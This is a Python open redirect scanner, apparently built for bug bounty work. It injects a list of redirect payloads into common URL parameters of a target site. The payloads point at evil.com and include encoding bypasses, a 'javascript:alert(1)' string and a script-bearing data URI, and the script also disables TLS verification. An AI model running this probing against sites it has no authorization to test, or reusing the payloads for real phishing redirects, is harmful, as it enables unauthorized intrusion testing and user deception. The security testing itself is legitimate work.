#!/usr/bin/env python3
"""
Roger Redirect - Open redirect vulnerability scanner for bug bounty hunting.
"""

import argparse
import requests
import urllib3
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Open redirect payloads
REDIRECT_PAYLOADS = [
    # Standard redirects
    "https://google.com",
    "https://evil.com",
    "//google.com",
    "//evil.com",
    "///google.com",
    "///evil.com",
    "https:/google.com",
    "https://google.com/",
    "/redirect?url=https://evil.com",
    # Unicode/spoofing
    "https://google.com.evil.com",
    "https://google.com%2F%2Fevil.com",
    "https://google.com%252F%252Fevil.com",
    "https://google.com%23@evil.com",
    "https://google.com%00.evil.com",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(1)",
    # Path-based
    "/external?url=https://evil.com",
    "/out?url=https://evil.com",
    "/go?url=https://evil.com",
    "/link?url=https://evil.com",
    "/url?url=https://evil.com",
    "/redirect?url=//evil.com",
    "/redirect?url=///evil.com",
    # Protocol-relative
    "//www.google.com/",
    "///www.google.com/",
]

# Parameters commonly vulnerable to open redirect
REDIRECT_PARAMS = [
    "url", "uri", "dest", "redirect", "next", "data", "reference", "site",
    "html", "val", "validate", "domain", "callback", "return", "page", "feed",
    "host", "port", "to", "out", "view", "dir", "show", "navigation", "open",
    "file", "document", "folder", "pg", "style", "doc", "img", "source",
    "target", "link", "src", "source", "u", "api", "oauth", "continue",
    "return_to", "returnUrl", "return_url", "destination", "dest_url",
    "redirect_url", "redirect_uri", "redirectto", "redir", "next",
]


class RogerRedirect:
    def __init__(self, target, threads=10, quiet=False, output=None, timeout=10):
        self.target = target.rstrip('/')
        self.threads = threads
        self.quiet = quiet
        self.output = output
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        
    def parse_url(self, url):
        """Parse URL and add protocol if needed."""
        if not url.startswith('http'):
            url = 'https://' + url
        return url
    
    def inject_payload(self, url, param, payload):
        """Inject payload into parameter."""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            # Add or replace parameter
            query[param] = [payload]
            
            new_query = urlencode(query, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            return urlunparse(new_parsed)
        except:
            return None
    
    def check_redirect(self, original_url, test_url):
        """Check if redirect occurred."""
        try:
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False  # Don't follow redirects
            )
            
            # Check for redirect status
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    return {
                        "status": response.status_code,
                        "location": location,
                        "redirect": True
                    }
            
            # Check final URL if we followed redirects
            final_response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            final_url = final_response.url
            
            # Check if URL changed to external
            original_parsed = urlparse(original_url)
            final_parsed = urlparse(final_url)
            
            if original_parsed.netloc != final_parsed.netloc:
                return {
                    "status": final_response.status_code,
                    "location": final_url,
                    "redirect": True,
                    "external": True
                }
            
            return None
            
        except requests.exceptions.Timeout:
            return {"error": "timeout"}
        except Exception as e:
            return {"error": str(e)}
    
    def scan_params(self, url):
        """Scan URL parameters for open redirect."""
        findings = []
        
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        
        # Test each redirect-vulnerable parameter
        for param in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS[:8]:  # Quick test
                test_url = self.inject_payload(url, param, payload)
                
                if not test_url:
                    continue
                
                result = self.check_redirect(url, test_url)
                
                if result and result.get("redirect"):
                    location = result.get("location", "")
                    
                    # Check if it's an external redirect
                    if result.get("external") or "evil.com" in location or "google.com" in location:
                        if not self.quiet:
                            print(f"  [!] Potential redirect: {param} -> {payload[:30]}")
                            print(f"      Location: {location}")
                        
                        findings.append({
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "location": location,
                            "status": result.get("status"),
                            "severity": "MEDIUM"
                        })
                        
                        # Found one, stop testing this param
                        break
        
        return findings
    
    def scan(self):
        """Run the open redirect scanner."""
        target = self.parse_url(self.target)
        
        print(f"[*] Starting open redirect scan on: {target}")
        print("=" * 60)
        
        # First, check if target has vulnerable parameters
        print("[*] Testing redirect parameters...")
        
        findings = self.scan_params(target)
        
        # Print results
        print()
        print("=" * 60)
        
        if findings:
            print("[!] POTENTIAL OPEN REDIRECT VULNERABILITIES:")
            print()
            
            unique = []
            seen = set()
            
            for f in findings:
                key = f"{f['parameter']}:{f['payload'][:20]}"
                if key not in seen:
                    seen.add(key)
                    unique.append(f)
            
            for finding in unique:
                print(f"[!] Parameter: {finding['parameter']}")
                print(f"    Payload: {finding['payload'][:50]}")
                print(f"    Redirects to: {finding['location'][:60]}")
                print(f"    Severity: {finding['severity']}")
                print()
                
                self.findings.append(finding)
        else:
            print("[*] No open redirect vulnerabilities found")
            print("[*] Try manually testing: url, redirect, next, callback parameters")
        
        # Summary
        print(f"[*] Total issues: {len(self.findings)}")
        
        # Save results
        if self.output and self.findings:
            with open(self.output, 'w') as f:
                f.write(f"# Open Redirect Scan Results for {target}\n\n")
                for finding in self.findings:
                    f.write(f"Parameter: {finding['parameter']}\n")
                    f.write(f"Payload: {finding['payload']}\n")
                    f.write(f"Location: {finding['location']}\n\n")
        
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="Roger Redirect - Open redirect vulnerability scanner for bug bounty hunting"
    )
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("-o", "--output", help="Output results to file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    scanner = RogerRedirect(
        target=args.target,
        threads=args.threads,
        quiet=args.quiet,
        output=args.output,
        timeout=args.timeout
    )
    
    scanner.scan()


if __name__ == "__main__":
    main()